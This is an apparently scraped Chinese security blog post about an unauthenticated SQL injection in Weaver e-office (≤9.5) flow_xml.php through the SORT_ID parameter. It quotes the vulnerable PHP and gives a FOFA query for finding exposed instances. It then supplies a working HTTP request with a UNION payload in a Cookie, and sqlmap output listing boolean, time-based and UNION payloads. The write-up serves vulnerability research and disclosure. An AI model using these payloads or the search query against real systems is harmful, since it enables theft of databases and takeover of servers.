---
title: "泛微e-office flow_xml.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-system-workflow-flow_type-flow_xml-SORT_ID-sqli.html
asset_dir: assets/泛微e-office-flow_xml.php-sql注入漏洞
---

# 泛微e-office flow\_xml.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/10 18:30
* 998浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

api

SQL

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office flow\_xml.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

直接看 flow\_xml.php 文件业务逻辑实现

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/xtree_xml.inc.php" );
include_once( "api/system_Workflow.class.php" );
( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
( "Cache-Control: no-cache, must-revalidate" );
( "Pragma: no-cache" );
( "Content-Type: text/xml" );
$xtreeXml = new xtreeXml( );
$xtreeXml->initXml( );
$workFlowDefine = new workFlowDefine( );
$flow_info = $workFlowDefine->getFlowInfo( "FLOW_NOORDER", "ASC", "FLOW_SORT=".$_REQUEST['SORT_ID'] );
while ( list( $key, $val ) = ( $flow_info ) )
{
    $src = "";
    $FLOW_ID = $val['FLOW_ID'];
    $run_id = 0;
    $sql = "SELECT RUN_ID FROM flow_run WHERE CURRENT_STEP > 0 AND FLOW_ID = '".$FLOW_ID."'";
    $rs = ( $connection, $sql );
    if ( $rows = ( $rs ) )
    {
        $run_id = $rows['RUN_ID'];
    }
    $action = "javascript:flow_point('".$FLOW_ID."','".$run_id."');";
    $target = "flow".__FILE__;
    $xtreeXml->creatItem( $val['FLOW_NAME'], $action, $src, $target, $icon );
}
$xtreeXml->endXml( );
?>
```

`SORT_ID` 直接带入 `getFlowInfo` 函数，业务逻辑如下

代码安全审计

```
public function getFlowInfo( $field = "", $norder = "", $WHERE = "" )
    {
        global $connection;
        $orderby = $this->set_orderby( $field, $norder );
        if ( $WHERE )
        {
            $condition = $WHERE;
        }
        else
        {
            $condition = " FLOW_ID=".$this->FLOW_ID;
        }
        $query = "SELECT * from FLOW_TYPE where ".$condition.$orderby;
        $cursor = ( $connection, $query );
```

深入探索

漏洞扫描服务

企业安全咨询

恶意软件分析工具

`SORT_ID` 是直接拼接进SQL语句中执行，无任何过滤，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

`SORT_ID` 通过 `$_REQUEST['SORT_ID']` 获取，`$_REQUEST` 在 PHP 里属于一个包含了 `GET` 、`POST` 和 `COOKIE` 方法传递参数的超全局数组，因此在测试时可使用 `Cookie` 传递 `SORT_ID` 值进入SQL语句中。

漏洞修复方案

# 漏洞复现

```
GET /general/system/workflow/flow_type/flow_xml.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: SORT_ID=1 UNION ALL SELECT NULL,CONCAT(0x716b717071,0x4a7472506b73516e4a5366674b796e4c4e75754c715a7a78774573635968615853586a586d554a62,0x7178787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![泛微e-office flow_xml.php sql注入漏洞](images/img-001-0f4c998e89f1.webp)](https://image.mrxn.net/6227c8d81b7a462e9a41b06b2b24f9f3.webp)

通过联合注入 成功在响应回显了测试payload。

物流软件安全

通过 [sqlmap](https://mrxn.net/tag/sqlmap) 还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: SORT_ID (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: SORT_ID=11 OR NOT 3433=3433#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: SORT_ID=11 OR (SELECT 7163 FROM (SELECT(SLEEP(5)))Uump)-- TPpo

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: SORT_ID=11 UNION ALL SELECT NULL,CONCAT(0x716b717071,0x4a7472506b73516e4a5366674b796e4c4e75754c715a7a78774573635968615853586a586d554a62,0x7178787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office flow\_xml.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-system-workflow-flow_type-flow_xml-SORT_ID-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-system-workflow-flow_type-flow_xml-SORT_ID-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-system-workflow-flow\_type-flow\_xml-SORT\_ID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANS0lEQVR4Aeyb0VbkSA5E+87///Mu1yIopSpdVMFMw4P3dHRIoZBsUjYUPWf/+fPnz/9exf/a/2ZvSlM/y/WnZiySh9V2eFRPLbzrV+v1Hs/aM7meILNeZRfy523IU3gbvvwBPvLMAP4Ad3rq4Q9DC4CjN55wLFB1KE4diOXoB+6+HuCofRjfg92M99IHQfV2L3BX/xBakJ7POC3HQpJc/PMnsCwEOJ4iWPnRbWbzUD3TC6XDyt2XGWHYe1PvvcbqsjAWsM5QE1C6XgGVWzPvUOvoNePUjD8D1HVg5dm3LGQWr/zvn8C3FwK18Twt4fmlTD05VD/cOLU54ywHPkrA8ZZHyCwo/SzXP2tqAqrXuANK7329/pX42wv5ykWvnvMT+PZC+tMBfFwpejiFmatPDViecj07wM0Ht3jnfUaDdQZUPu9v5pmtnvir/O2FfPXCV9/+BJaFuOEd9q2rmr5VvWVQTxusbF9cxjukPvmRN7XZA3X9qZunJ6wm4LzH+jPIzMmzd1nILH45vxq/fALHQqCeAHjMj64C1RsPrHn0PCHJZVi98Di3pwPo6RIDx8+jed3kUHWb4BabBztvap2Bnh4xcFwfHvNhfvvrWMgbX39+yQn8k+2/wrl3exJPtiagnozUoXJrAm7/7hSPukgehupNHn7V2/3GIrNk2F/HmoCq2yegcmuB+ldwvSE5wV/Cy0LgftPeJ5QO55ynQX/HmQ41q3th1WDN5yyoOty4z+sx3Dywj7v/UZz7gJqTXIbS0g+Vw2OO/1gIlNmBAiqPKWztDLD2wJpnxmTnRTMWM1cTn+mpy/qFsTDuUBPRZtxz2H8tvVf/DtOTfDLUNY6F7AZd2s+cwHYh2R7U1nJrUDkUR5fTY9wB5Z315EC3HzGwfFQ8xLe/oPS38O5P5qUA5Z166mEoX/IdZ0YYznumB/Ze2Ovbhexu6tL+zgk8XEi2fcbAx10C26c6Bqh6ZkHlqT9iOLwf/1k2Xig9+Y5h78l9pMccVi9UDsXdqz95Z3jsharbL6DyzHi4kJgu/nsnsCwE1m3lNqB0WNk6lGb8XcA6yydIZC7s63qgasY7QNVh5T478eyPDtWbPAylw/0vuVC1eCfPay0LmeYr//snsCwk28ptwLrd1DvHe8bdaxyfcQD768Cqpxfu9bNZsHrjy6xwdBnWnumBfV0fVM05Qk0Yd6h1QPUtC+mGK/6ZE/gHzr/v9Y0aQ21xd6vWd4gXqhfuOZ5XGWqWfXCLe557UnsWZz1Q1zirq89rqAmoXiiOD9b8ekNyMr+EHy4EantQ7KZFv3dz0TVjqB4o1tOhZyJ1eK4nfuckDqsJqFnGAiqPLwylA9oeAjh+55omYEqf5rl+jA8XEtPFf+8Ejv9AlcsBx+bn1mYdygekdMdzBnDMhuLU5TRD1ZJP1tsB5/745ozk8N77Luh/D+/ImkjBWCTfMazzd56uOU9cb0g/lV8QH5+yoLbphsTZfVnr0AfVC8VqAirvfmNrAqoO95/yrAu4eeAWWxPOE4DpQ+gT0wR8vLmpQWkzt19En9xrxmLnUYf9NbZvCKxmBwhYdS+m3gH3Hn1B9xpHl82FcYdaB6zXsBY/VA2Kp57cns8wvclhnZ051nts/iq2C3l1yOX/907g+KGerUJtPvm8zE6H6vnMC+e+9EJ55nWgdCie9fTLj2q7OtRMawGUBiunHoa1Drd8emZ+dp/XG5